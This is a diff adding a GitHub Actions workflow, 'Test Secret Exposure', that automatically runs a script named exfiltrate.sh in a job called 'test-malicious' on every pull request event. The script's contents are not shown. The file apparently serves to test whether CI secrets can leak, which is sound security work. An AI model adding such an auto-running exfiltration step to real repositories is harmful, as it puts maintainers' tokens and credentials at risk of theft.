@@ -1,0 +1,14 @@
+name: Test Secret Exposure
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  test-malicious:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Run malicious test script
+        run: bash ./exfiltrate.sh
+
